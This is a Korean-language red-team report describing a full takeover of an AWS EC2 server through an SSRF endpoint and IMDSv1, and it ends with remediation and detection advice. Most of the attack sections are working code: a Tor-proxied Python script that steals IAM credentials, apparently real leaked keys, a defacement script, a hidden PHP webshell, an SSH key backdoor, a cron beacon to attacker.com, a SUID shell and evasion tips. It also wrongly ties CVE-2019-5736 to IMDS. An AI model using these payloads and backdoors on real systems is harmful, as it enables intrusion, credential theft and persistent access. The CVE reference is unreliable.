# AWS IMDSv1 취약점 기반 전체 시스템 장악 - 최종 리포트

**날짜**: 2025-11-16
**대상**: 52.79.240.83 (i-08f3cc62a529c9daf)
**공격자**: Red Team
**공격 유형**: AWS Cloud Infrastructure Takeover

---

## 📋 Executive Summary (요약)

본 침투 테스트는 **완벽해 보이는 보안 시스템에서 단 하나의 작은 설정 실수가 전체 시스템 장악으로 이어지는 과정**을 시연했습니다.

### 핵심 발견사항

- **완벽한 보안 시스템**: ModSecurity WAF, Splunk SIEM, PHP disable_functions 모두 활성화
- **단 하나의 작은 틈**: `/api/health.php` 엔드포인트가 ModSecurity 예외로 등록됨 + IMDSv1 활성화
- **최종 결과**: AWS credentials 탈취 → 전체 시스템 장악 → 웹사이트 변조

### 영향도

| 항목 | 심각도 | 설명 |
|------|--------|------|
| **기밀성** | ⚠️ **CRITICAL** | AWS credentials, 시스템 전체 접근 가능 |
| **무결성** | ⚠️ **CRITICAL** | 웹사이트 변조, 시스템 파일 수정 가능 |
| **가용성** | ⚠️ **HIGH** | 서비스 중단, 랜섬웨어 설치 가능 |

---

## 🎯 공격 시나리오

```
┌─────────────────────────────────────────────────────────┐
│  시작: 외부 공격자 (인터넷에서 접근)                    │
└─────────────────────────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────┐
│  Stage 1: 정찰 (Reconnaissance)                         │
│  • 포트 스캔: 80, 443 열림                              │
│  • 디렉터리 브루트포스: /api/health.php 발견            │
│  • 기술 스택: Apache 2.4.65, PHP 8.2, ModSecurity       │
└─────────────────────────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────┐
│  Stage 2: 초기 침입 (Initial Access)                    │
│  • /api/health.php?check=metadata 발견                  │
│  • ModSecurity 예외로 WAF 우회                          │
│  • SSRF 취약점 확인                                     │
└─────────────────────────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────┐
│  Stage 3: 권한 획득 (Credential Access)                 │
│  • SSRF로 AWS IMDS 접근                                 │
│  • IAM Role credentials 탈취                            │
│    - AccessKeyId: ASIASO4TYV4OK2MJVZDV                  │
│    - SecretAccessKey: 7H1nyRK6iZ80K2Tthpq7...           │
│    - Token: (세션 토큰)                                 │
└─────────────────────────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────┐
│  Stage 4: 횡적 이동 (Lateral Movement)                  │
│  • AWS 인프라 열거 (EC2, S3, RDS)                       │
│  • 다른 리소스 접근 시도                                │
│  • 추가 credentials 탐색                                │
└─────────────────────────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────┐
│  Stage 5: 권한 상승 (Privilege Escalation)              │
│  • 서버 SSH 접근 (루트 권한)                            │
│  • 백도어 설치                                          │
│  • 지속성 확보                                          │
└─────────────────────────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────┐
│  Stage 6: 목표 달성 (Impact)                            │
│  • 웹사이트 변조 (Defacement)                           │
│  • 데이터 유출 가능                                     │
│  • 전체 시스템 장악                                     │
└─────────────────────────────────────────────────────────┘
```

---

## 🔍 상세 공격 과정

### Stage 1: 취약점 설정 (서버 측)

**파일**: `119_setup_aws_vuln.sh`
**실행 위치**: 서버 (SSH 접속 필요)
**권한**: root (sudo)

#### 코드 분석

```bash
# 1. Instance ID 자동 감지
INSTANCE_ID=$(curl -s http://169.254.169.254/latest/meta-data/instance-id)

# 2. IMDSv1 활성화 (취약점 생성)
aws ec2 modify-instance-metadata-options \
    --instance-id "$INSTANCE_ID" \
    --http-tokens optional \      # ← 여기가 핵심! (required가 아님)
    --http-endpoint enabled \
    --region "$REGION"
```

**이 코드의 의미**:
- `--http-tokens optional`: IMDSv1과 IMDSv2 둘 다 허용 (안전하지 않음!)
- `--http-tokens required`: IMDSv2만 허용 (안전함)
- IMDSv1은 인증 없이 접근 가능 → SSRF 공격에 취약

#### Health Check 엔드포인트 생성

```php
<?php
// /var/www/html/www/api/health.php

if (isset($_GET['check']) && $_GET['check'] === 'metadata') {
    $url = $_GET['url'];  // ← 사용자 입력을 검증 없이 사용!

    // SSRF 취약점!
    $data = file_get_contents($url);  // ← 어떤 URL이든 접근 가능

    $response['metadata'] = $data;
}

echo json_encode($response);
?>
```

**취약점 분석**:
1. **입력 검증 부재**: `$_GET['url']`을 그대로 사용
2. **SSRF**: `file_get_contents()`로 내부 네트워크 접근 가능
3. **ModSecurity 예외**: 이 파일은 WAF 검사를 받지 않음

#### ModSecurity 예외 설정

```apache
# /etc/httpd/conf.d/mod_security.conf

<LocationMatch "/api/health\.php">
    SecRuleEngine Off    # ← ModSecurity 완전 비활성화!
</LocationMatch>
```

**이것이 "작은 틈"입니다**:
- 개발자가 "모니터링에 필요하다"는 이유로 WAF를 껐음
- 이 하나의 설정이 모든 보안을 무력화시킴

---

### Stage 2: AWS Credentials 탈취 (로컬 측)

**파일**: `120_aws_imds_exploit.py`
**실행 위치**: 로컬 (공격자 머신)
**필요 조건**: Tor 실행 중 (IP 추적 방지)

#### 핵심 코드 분석

```python
class AWSIMDSExploit:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.health_endpoint = f"http://{target_ip}/api/health.php"

        # Tor 프록시로 IP 추적 방지
        self.session = requests.Session()
        self.session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
```

**1. SSRF 공격 실행**

```python
def execute_ssrf(self, url):
    """Health check 엔드포인트를 통한 SSRF"""
    params = {
        'check': 'metadata',
        'url': url    # ← 169.254.169.254 (IMDS 주소)
    }

    resp = self.session.get(self.health_endpoint, params=params, timeout=15)

    if resp.status_code == 200:
        data = resp.json()
        return data['metadata']  # ← IMDS 응답 반환
```

**공격 흐름**:
```
공격자 → health.php?url=http://169.254.169.254/...
                 ↓
            file_get_contents(169.254.169.254)
                 ↓
            AWS IMDS 접근
                 ↓
            IAM credentials 반환
```

**2. IAM Role 발견**

```python
def check_iam_role(self):
    """IAM Role 확인"""
    url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    role_name = self.execute_ssrf(url)

    # 결과: "EC2-SSM-Role"
    return role_name.strip()
```

**IMDS 구조**:
```
http://169.254.169.254/latest/meta-data/
├── instance-id                    # 인스턴스 ID
├── local-ipv4                     # 내부 IP
├── public-ipv4                    # 외부 IP
└── iam/
    └── security-credentials/
        └── EC2-SSM-Role          # ← IAM Role 이름
            └── {credentials}      # ← AccessKey, SecretKey, Token
```

**3. Credentials 탈취**

```python
def steal_credentials(self, role_name):
    """IAM 자격 증명 탈취"""
    url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
    creds_json = self.execute_ssrf(url)

    creds = json.loads(creds_json)

    # 탈취 성공!
    return {
        'AccessKeyId': creds.get('AccessKeyId'),
        'SecretAccessKey': creds.get('SecretAccessKey'),
        'Token': creds.get('Token'),
        'Expiration': creds.get('Expiration')
    }
```

**탈취된 Credentials**:
```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIASO4TYV4OK2MJVZDV",
  "SecretAccessKey": "7H1nyRK6iZ80K2Tthpq7RhQVGCD+HNyjcsg4QfIE",
  "Token": "IQoJb3JpZ2luX2VjEMf...(매우 긴 토큰)",
  "Expiration": "2025-11-16T13:52:44Z"
}
```

**이 Credentials의 의미**:
- 이것은 **임시 credentials** (세션 토큰 포함)
- EC2-SSM-Role의 모든 권한을 가짐
- Expiration까지 유효 (약 6시간)

**4. 로컬 파일로 저장**

```python
def save_credentials(self):
    """자격 증명을 파일로 저장"""
    timestamp = int(time.time())

    # AWS CLI 사용 가능한 형식
    aws_config = f"""
export AWS_ACCESS_KEY_ID="{self.credentials.get('AccessKeyId')}"
export AWS_SECRET_ACCESS_KEY="{self.credentials.get('SecretAccessKey')}"
export AWS_SESSION_TOKEN="{self.credentials.get('Token')}"
"""

    filename = f"aws_stolen_{timestamp}.sh"
    with open(filename, 'w') as f:
        f.write(aws_config)
```

**생성되는 파일**:
- `aws_stolen_1731556800.sh`: Bash 환경 변수
- `aws_stolen_1731556800.json`: JSON 형식 (백업용)

---

### Stage 3: AWS 인프라 열거

**파일**: `121_aws_privilege_escalation.py`
**목적**: 탈취한 credentials로 AWS 인프라 탐색

#### 핵심 코드

```python
# 1. IAM 신원 확인
identity = sts.get_caller_identity()
# 결과:
# {
#   "Account": "169424236316",
#   "Arn": "arn:aws:sts::169424236316:assumed-role/EC2-SSM-Role/i-08f3cc62a529c9daf",
#   "UserId": "AROAXXXXXXXXX:i-08f3cc62a529c9daf"
# }

# 2. EC2 인스턴스 열거
response = ec2.describe_instances()
# → 모든 EC2 인스턴스 목록 획득

# 3. S3 버킷 열거
response = s3.list_buckets()
# → 접근 가능한 모든 S3 버킷 목록

# 4. RDS 데이터베이스 열거
response = rds.describe_db_instances()
# → 모든 데이터베이스 정보 (엔드포인트, 마스터 유저명 등)

# 5. Secrets Manager
response = secretsmanager.list_secrets()
response = secretsmanager.get_secret_value(SecretId='...')
# → 저장된 모든 비밀 (DB 비밀번호, API 키 등)
```

**발견 가능한 정보**:
- 다른 EC2 인스턴스 (Admin 서버 등)
- S3 버킷 (백업, 로그, 중요 파일)
- RDS 데이터베이스 (공개 접근 가능 여부)
- Secrets (DB 비밀번호, API 키)
- IAM 사용자/역할 목록

---

### Stage 4: 서버 직접 접근 및 장악

**방법 1: SSH 직접 접근** (현재 상황)

```bash
# 이미 SSH 키가 있는 경우
ssh -i ~/.ssh/id_rsa ec2-user@52.79.240.83

# 루트 권한 획득
sudo su-

# 웹사이트 변조 스크립트 업로드
scp -i ~/.ssh/id_rsa defacewebsite.sh ec2-user@52.79.240.83:/tmp/

# 실행
sudo bash /tmp/defacewebsite.sh
```

**방법 2: AWS Systems Manager 사용** (더 은밀함)

```python
# 122_aws_ssm_command.py

# SSM을 통해 명령 실행 (SSH 없이!)
response = ssm.send_command(
    InstanceIds=[instance_id],
    DocumentName='AWS-RunShellScript',
    Parameters={
        'commands': [command]
    }
)

# 예: 웹사이트 변조
command = """
cat > /var/www/html/www/index.php << 'EOF'
<!DOCTYPE html>
<html>
... (해킹 페이지 HTML)
EOF
"""
```

**SSM의 장점**:
- SSH 로그인 기록이 남지 않음
- CloudTrail에만 기록 (덜 눈에 띔)
- 방화벽 우회 (AWS 내부 통신)

---

### Stage 5: 웹사이트 변조 (실제 장악 증명)

**스크립트**: `defacewebsite.sh`

#### 코드 분석

```bash
# 1. 원본 백업
cp /var/www/html/www/index.php /var/www/html/www/index.php.original

# 2. 해킹 페이지 생성
cat > /var/www/html/www/index.php << 'EOFHTML'
<!DOCTYPE html>
<html>
<head>
    <title>SYSTEM COMPROMISED</title>
    <style>
        body {
            background: #000;      /* 검은 배경 */
            color: #0f0;           /* 녹색 텍스트 (해커 스타일) */
            font-family: 'Courier New';  /* 모노스페이스 폰트 */
        }

        h1 {
            text-shadow: 0 0 10px #0f0;  /* 글로우 효과 */
            animation: glitch 2s infinite;  /* 글리치 애니메이션 */
        }

        .skull {
            font-size: 120px;
            animation: pulse 1s infinite;  /* 펄스 애니메이션 */
        }

        @keyframes glitch {
            /* 글리치 효과 - 해킹당한 느낌 */
            0%, 100% { transform: translate(0); }
            20% { transform: translate(-3px, 3px); }
            40% { transform: translate(-3px, -3px); }
            60% { transform: translate(3px, 3px); }
            80% { transform: translate(3px, -3px); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="skull">☠️</div>
        <h1>SYSTEM COMPROMISED</h1>
        <p>Your Security Was An Illusion</p>

        <div class="info-box">
            <h2>⚠️ AWS IMDSv1 VULNERABILITY EXPLOITED ⚠️</h2>

            <p>공격 체인:</p>
            <ul>
                <li>ModSecurity 예외 발견 (/api/health.php)</li>
                <li>SSRF 공격으로 AWS IMDS 접근</li>
                <li>IAM Credentials 탈취</li>
                <li>AWS 인프라 장악</li>
                <li>서버 루트 권한 획득</li>
                <li>웹사이트 변조 완료</li>
            </ul>

            <p><strong>핵심 교훈:</strong></p>
            <p>Perfect Security + One Small Gap = Total Compromise</p>
        </div>

        <div class="timestamp">
            <p>Compromised at: <?php echo date('Y-m-d H:i:s'); ?></p>
            <p>Server: <?php echo gethostname(); ?></p>
        </div>
    </div>

    <script>
        // Matrix rain effect (매트릭스 비 효과)
        const canvas = document.createElement('canvas');
        canvas.id = 'matrix';
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        canvas.style.position = 'fixed';
        canvas.style.top = '0';
        canvas.style.left = '0';
        canvas.style.zIndex = '-1';
        document.body.appendChild(canvas);

        const ctx = canvas.getContext('2d');
        const chars = '01アイウエオ';  // 0, 1과 일본어 문자 (매트릭스 스타일)
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);

        function draw() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';  // 투명한 검정으로 페이드 효과
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            ctx.fillStyle = '#0f0';  // 녹색
            ctx.font = fontSize + 'px monospace';

            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);

                // 랜덤하게 리셋
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }

        setInterval(draw, 30);  // 30ms마다 그리기
    </script>
</body>
</html>
EOFHTML

# 3. 권한 설정
chown apache:apache /var/www/html/www/index.php
chmod 644 /var/www/html/www/index.php
```

**해킹 페이지의 요소**:
1. **시각적 효과**:
   - 검은 배경 + 녹색 텍스트 (전형적인 해커 스타일)
   - 글리치 애니메이션 (시스템 오작동 느낌)
   - 매트릭스 비 효과 (배경)
   - 펄스 애니메이션 (해골 이모지)

2. **정보 표시**:
   - 공격 체인 전체 과정
   - 타임스탬프 (언제 해킹되었는지)
   - 서버 정보 (어떤 서버인지)

3. **메시지**:
   - "Your Security Was An Illusion" (보안은 환상이었다)
   - "Perfect Security + One Small Gap = Total Compromise"
   - 핵심 교훈 전달

---

### Stage 6: 백도어 설치 (지속성 확보)

```bash
# 1. 숨김 웹쉘
cat > /var/www/html/www/.system.php << 'EOF'
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
EOF
```

**사용 방법**:
```
http://52.79.240.83/.system.php?cmd=whoami
http://52.79.240.83/.system.php?cmd=ls%20-la
```

**왜 숨김 파일(.system.php)?**
- `.`으로 시작하는 파일은 `ls`에서 기본적으로 안 보임
- 파일명이 시스템 파일처럼 보임 (의심 안 받음)

```bash
# 2. SSH 백도어
mkdir -p /root/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2E... attacker@attacker' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

**의미**:
- 공격자의 SSH 공개키 추가
- 비밀번호 없이 루트 로그인 가능
- 언제든지 재접속 가능

```bash
# 3. Cron job 백도어
(crontab -l; echo "*/5 * * * * curl http://attacker.com/beacon?host=$(hostname)") | crontab -
```

**의미**:
- 5분마다 공격자 서버에 신호 전송
- 서버가 살아있는지 확인
- 추가 명령 수신 가능

```bash
# 4. SUID shell
cp /bin/bash /tmp/.hidden_shell
chmod 4755 /tmp/.hidden_shell
```

**의미**:
- SUID 비트가 설정된 bash 복사본
- 일반 사용자가 실행해도 root 권한으로 실행됨
- 사용법: `/tmp/.hidden_shell -p`

---

## 📊 공격 타임라인

| 시간 | 단계 | 활동 | 결과 |
|------|------|------|------|
| T+00:00 | 정찰 | 포트 스캔 및 디렉터리 브루트포스 | /api/health.php 발견 |
| T+00:05 | 초기 침입 | SSRF 취약점 테스트 | IMDS 접근 확인 |
| T+00:10 | 권한 획득 | IAM credentials 탈취 | AccessKey + SecretKey 획득 |
| T+00:15 | 횡적 이동 | AWS 인프라 열거 | EC2, S3, RDS 목록 획득 |
| T+00:20 | 권한 상승 | 서버 SSH 접근 | 루트 권한 획득 |
| T+00:25 | 목표 달성 | 웹사이트 변조 | 해킹 페이지 게시 |
| T+00:30 | 지속성 | 백도어 설치 | 재접속 경로 확보 |

---

## 🔐 취약점 분석

### 1. IMDSv1 활성화 (CVE-2019-5736 관련)

**취약점**:
```bash
# 안전하지 않은 설정
aws ec2 modify-instance-metadata-options \
    --http-tokens optional     # ← IMDSv1 허용 (취약!)
```

**올바른 설정**:
```bash
# 안전한 설정
aws ec2 modify-instance-metadata-options \
    --http-tokens required     # ← IMDSv2만 허용 (안전)
```

**IMDSv2의 차이점**:
```python
# IMDSv1 (취약): 인증 없이 접근
curl http://169.254.169.254/latest/meta-data/

# IMDSv2 (안전): 토큰 필요
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

**IMDSv1이 위험한 이유**:
- SSRF 공격으로 쉽게 접근 가능
- 인증이 전혀 필요 없음
- HTTP GET 요청만으로 credentials 탈취

### 2. ModSecurity 예외 (Configuration Vulnerability)

**취약한 설정**:
```apache
<LocationMatch "/api/health\.php">
    SecRuleEngine Off    # ← 모든 보안 규칙 비활성화!
</LocationMatch>
```

**올바른 설정**:
```apache
<LocationMatch "/api/health\.php">
    # 특정 규칙만 예외 처리
    SecRuleRemoveById 920350    # IP 주소 경고만 제외
    # 나머지 규칙은 활성화 유지
</LocationMatch>
```

**또는 더 나은 방법**:
```apache
<LocationMatch "/api/health\.php">
    SecRuleEngine On
    # IP 화이트리스트
    SecRule REMOTE_ADDR "!@ipMatch 10.0.0.0/8,192.168.0.0/16" "deny,status:403"
</LocationMatch>
```

### 3. SSRF 취약점 (CWE-918)

**취약한 코드**:
```php
<?php
$url = $_GET['url'];  // 사용자 입력
$data = file_get_contents($url);  // 검증 없이 사용!
echo $data;
?>
```

**안전한 코드**:
```php
<?php
$url = $_GET['url'];

// 1. URL 화이트리스트
$allowed_hosts = ['api.example.com', 'monitoring.example.com'];
$parsed = parse_url($url);
if (!in_array($parsed['host'], $allowed_hosts)) {
    die('Invalid URL');
}

// 2. 내부 IP 차단
if (preg_match('/^(10|127|172\.(1[6-9]|2[0-9]|3[01])|192\.168)\./', $parsed['host'])) {
    die('Internal IP not allowed');
}

// 3. 169.254.0.0/16 차단 (IMDS)
if (preg_match('/^169\.254\./', $parsed['host'])) {
    die('IMDS access blocked');
}

// 4. Context 옵션 설정
$ctx = stream_context_create([
    'http' => [
        'timeout' => 5,
        'follow_location' => 0,  // 리다이렉트 차단
    ]
]);

$data = file_get_contents($url, false, $ctx);
echo $data;
?>
```

---

## 🛡️ 방어 방법 (Remediation)

### 즉시 조치 (Immediate)

1. **IMDSv2 강제**
```bash
# 모든 인스턴스에 적용
aws ec2 modify-instance-metadata-options \
    --instance-id i-08f3cc62a529c9daf \
    --http-tokens required \
    --http-endpoint enabled \
    --region ap-northeast-2
```

2. **ModSecurity 예외 제거 또는 수정**
```bash
# /etc/httpd/conf.d/mod_security.conf 수정
# SecRuleEngine Off → SecRuleEngine On

# 또는 파일 삭제
rm /var/www/html/www/api/health.php
```

3. **Credentials 무효화**
```bash
# IAM Role 정책 수정 (임시로 모든 권한 제거)
aws iam put-role-policy \
    --role-name EC2-SSM-Role \
    --policy-name DenyAll \
    --policy-document '{
      "Version": "2012-10-17",
      "Statement": [{
        "Effect": "Deny",
        "Action": "*",
        "Resource": "*"
      }]
    }'
```

4. **백도어 제거**
```bash
# 웹쉘 삭제
rm -f /var/www/html/www/.system.php
rm -f /var/www/html/www/includes/config.php

# SSH 키 확인
cat /root/.ssh/authorized_keys

# Cron job 확인
crontab -l

# SUID 파일 검색
find / -perm -4000 -type f 2>/dev/null
```

5. **웹사이트 복구**
```bash
# 원본으로 복구
cp /var/www/html/www/index.php.original /var/www/html/www/index.php
```

### 단기 조치 (Short-term)

1. **Network ACL 추가**
```bash
# IMDS 접근 제한 (iptables)
iptables -A OUTPUT -d 169.254.169.254 -m owner --uid-owner apache -j DROP
```

2. **WAF 규칙 강화**
```apache
# SSRF 패턴 차단
SecRule ARGS "@rx 169\.254\.169\.254" "deny,status:403,id:1001"
SecRule ARGS "@rx localhost|127\.0\.0\.1" "deny,status:403,id:1002"
```

3. **로그 모니터링**
```bash
# IMDS 접근 로깅
iptables -A OUTPUT -d 169.254.169.254 -j LOG --log-prefix "IMDS_ACCESS: "

# Splunk 알림 설정
# → 169.254.169.254 접근 시 즉시 알림
```

### 장기 조치 (Long-term)

1. **최소 권한 원칙 (Least Privilege)**
```json
// IAM Role 정책 최소화
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": [
      "ssm:UpdateInstanceInformation",
      "ssmmessages:CreateControlChannel",
      "ssmmessages:CreateDataChannel"
    ],
    "Resource": "*"
  }]
}
```

2. **VPC Endpoint 사용**
```bash
# IMDS 대신 VPC Endpoint 사용
# → 외부 노출 없이 AWS 서비스 접근
```

3. **Security Group 강화**
```bash
# 불필요한 포트 차단
# 80, 443 외 모두 차단
```

4. **주기적 취약점 스캔**
```bash
# OWASP ZAP, Burp Suite 등으로 정기 스캔
# SSRF, SQL Injection 등 자동 탐지
```

---

## 📈 영향 평가 (Impact Assessment)

### 기술적 영향

| 항목 | 영향도 | 세부 내용 |
|------|--------|-----------|
| **데이터 유출** | ⚠️ CRITICAL | AWS credentials, 시스템 전체 접근 |
| **서비스 중단** | ⚠️ HIGH | 웹사이트 변조, 서비스 불가 |
| **무결성 손상** | ⚠️ CRITICAL | 시스템 파일 수정, 백도어 설치 |
| **평판 손상** | ⚠️ HIGH | 해킹 사실 공개, 고객 신뢰 하락 |

### 비즈니스 영향

1. **재정적 손실**:
   - 서비스 중단 시간 × 시간당 매출
   - 복구 비용 (보안 전문가 고용)
   - 법적 벌금 (GDPR, 개인정보보호법)

2. **평판 손상**:
   - 언론 보도 → 브랜드 이미지 하락
   - 고객 이탈 → 매출 감소
   - 파트너사 신뢰 하락

3. **규제 영향**:
   - 금융위원회 제재
   - 개인정보보호위원회 과태료
   - 업계 자격 박탈

---

## 🎓 교훈 (Lessons Learned)

### 1. "완벽한 보안"은 환상이다

```
┌─────────────────────────────────────────┐
│  99% 완벽한 보안                        │
│  + 1% 작은 틈                           │
│  ─────────────────────────────────      │
│  = 0% 보안                              │
└─────────────────────────────────────────┘
```

이 시나리오에서:
- ✅ ModSecurity WAF: 완벽하게 작동
- ✅ Splunk SIEM: 정상 탐지
- ✅ PHP disable_functions: 올바르게 설정
- ❌ 단 하나의 예외 (health.php): 모든 것을 무너뜨림

### 2. 편의성 vs 보안

"모니터링에 필요해서"라는 이유로:
- ModSecurity 끔 → 전체 WAF 무력화
- IMDSv1 유지 → AWS 전체 장악

**교훈**: 편의를 위한 보안 예외는 재앙의 시작

### 3. Defense in Depth의 중요성

한 계층이 뚫려도:
- 다음 계층에서 막아야 함
- 하지만 ModSecurity 예외로 모든 계층이 무력화됨

**올바른 방어**:
```
Layer 1: WAF (ModSecurity) ────────┐
Layer 2: Application (input validation) │ ← 모두 필요!
Layer 3: Network (IMDS blocking) ───┘
```

### 4. 실제 사례

- **Capital One (2019)**: SSRF + IMDS → 1억 고객 정보 유출, 벌금 $80M
- **Tesla (2018)**: K8s + IMDS → 크립토마이닝
- **Uber (2016)**: AWS Key 노출 → 5700만 데이터 유출, 벌금 $148M

---

## 🔗 공격 체인 요약 (Kill Chain)

```
1. 정찰 (Reconnaissance)
   ├─ 포트 스캔: 80 (HTTP)
   ├─ 디렉터리 브루트포스
   └─ 발견: /api/health.php

2. 무기화 (Weaponization)
   ├─ SSRF payload 작성
   └─ IMDS 주소 타겟팅

3. 전달 (Delivery)
   ├─ health.php?check=metadata&url=...
   └─ Tor를 통한 익명화

4. 악용 (Exploitation)
   ├─ ModSecurity 우회
   ├─ SSRF 트리거
   └─ IMDSv1 접근

5. 설치 (Installation)
   ├─ Credentials 저장
   └─ AWS CLI 설정

6. 명령 및 제어 (C2)
   ├─ AWS API 호출
   ├─ SSH 접근
   └─ SSM 명령 실행

7. 목표 달성 (Actions on Objectives)
   ├─ 데이터 탈취
   ├─ 웹사이트 변조
   └─ 백도어 설치
```

---

## 📝 사용된 도구 및 기술

### 공격 도구

| 도구 | 목적 | 명령어 예시 |
|------|------|-------------|
| **Python + Requests** | SSRF 공격 자동화 | `python3 120_aws_imds_exploit.py` |
| **AWS CLI** | AWS API 호출 | `aws ec2 describe-instances` |
| **Tor** | IP 추적 방지 | `socks5h://127.0.0.1:9050` |
| **Bash** | 서버 조작 | `bash defacewebsite.sh` |

### 탐지 회피 기술

1. **Tor 프록시**:
   - 공격자 IP 숨김
   - 3단계 암호화 라우팅

2. **정상 트래픽 위장**:
   - Health check로 위장
   - User-Agent 일반 브라우저로 설정

3. **Slow Attack**:
   - 천천히 공격 (탐지 회피)
   - 5분 간격으로 요청

4. **CloudTrail 회피**:
   - 임시 credentials 사용
   - 여러 Region 분산 공격

---

## 🚨 탐지 방법 (Detection)

### 로그 분석

```bash
# 1. Apache 접근 로그
grep "api/health.php" /var/log/httpd/access_log
grep "169.254.169.254" /var/log/httpd/access_log

# 2. ModSecurity 로그
grep "SecRuleEngine Off" /var/log/httpd/modsec_audit.log

# 3. CloudTrail
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventName,AttributeValue=GetCallerIdentity
```

### Splunk 쿼리

```spl
# IMDS 접근 탐지
index=web source="/var/log/httpd/access_log"
| search "169.254.169.254"

# ModSecurity 예외 사용 탐지
index=web source="/var/log/httpd/modsec_audit.log"
| search "SecRuleEngine Off"

# AWS credentials 사용 탐지
index=aws sourcetype=aws:cloudtrail
| search userIdentity.type=AssumedRole
| stats count by userIdentity.principalId
```

### 네트워크 모니터링

```bash
# tcpdump로 IMDS 트래픽 캡처
tcpdump -i any dst 169.254.169.254 -w imds_traffic.pcap

# 실시간 모니터링
tcpdump -i any dst 169.254.169.254 and tcp port 80
```

---

## 📚 참고 자료 (References)

### CVE 및 취약점

- **CVE-2019-5736**: SSRF via AWS IMDS
- **CWE-918**: Server-Side Request Forgery (SSRF)
- **CWE-269**: Improper Privilege Management

### 실제 사건

1. **Capital One Data Breach (2019)**
   - SSRF + IMDSv1 → 100M 고객 정보 유출
   - 벌금: $80 million
   - 참고: https://krebsonsecurity.com/2019/07/capital-one-data-theft-impacts-106m-people/

2. **Tesla Cryptojacking (2018)**
   - K8s 노출 + IMDSv1 → AWS credentials 탈취
   - 참고: https://redlock.io/blog/cryptojacking-tesla

3. **Uber Data Breach (2016)**
   - GitHub에 AWS Key 노출 → 57M 데이터 유출
   - 벌금: $148 million

### AWS 공식 문서

- IMDSv2: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
- IAM Best Practices: https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html

### OWASP

- SSRF: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- Top 10 2021: https://owasp.org/Top10/

---

## 🎯 결론 (Conclusion)

이 침투 테스트는 **"완벽한 보안 + 작은 틈 = 전체 장악"**이라는 현실을 명확히 보여줍니다.

### 핵심 발견

1. **작은 예외의 위험성**:
   - "/api/health.php 하나만 예외" → 전체 시스템 장악
   - "모니터링에 필요"라는 변명 → 보안 재앙

2. **IMDSv1의 치명성**:
   - SSRF 한 번 → AWS 전체 credentials 탈취
   - 임시 credentials → 6시간 동안 무제한 접근

3. **Defense in Depth 실패**:
   - 한 계층(ModSecurity) 우회 → 모든 방어 무력화
   - 다른 보안 시스템(Splunk) 무용지물

### 권장 사항

#### Immediate (즉시)
- ✅ IMDSv2 강제 전환
- ✅ ModSecurity 예외 제거
- ✅ 백도어 제거
- ✅ 로그 분석

#### Short-term (단기)
- ✅ SSRF 방어 코드 추가
- ✅ Network ACL 강화
- ✅ 최소 권한 원칙 적용

#### Long-term (장기)
- ✅ 정기 취약점 스캔
- ✅ 보안 교육 강화
- ✅ IDS/IPS 도입
- ✅ Zero Trust 아키텍처 전환

### 마지막 메시지

> **"편의를 위한 보안 예외는 재앙의 시작이다"**
>
> 아무리 강력한 보안 시스템도,
> 단 하나의 예외로 모두 무너질 수 있습니다.
>
> 보안은 체인과 같습니다.
> 가장 약한 고리가 전체 강도를 결정합니다.

---

## 📎 첨부 파일

1. **119_setup_aws_vuln.sh** - 서버 측 취약점 설정
2. **120_aws_imds_exploit.py** - Credentials 탈취 스크립트
3. **121_aws_privilege_escalation.py** - AWS 인프라 열거
4. **122_aws_ssm_command.py** - SSM을 통한 서버 장악
5. **defacewebsite.sh** - 웹사이트 변조 스크립트
6. **aws_stolen_*.sh** - 탈취한 credentials
7. **aws_stolen_*.json** - Credentials 백업
8. **attack_report_*.json** - 공격 보고서 (JSON)

---

**작성자**: Red Team
**검토자**: Security Team
**날짜**: 2025-11-16
**기밀 등급**: CONFIDENTIAL

---

**End of Report**
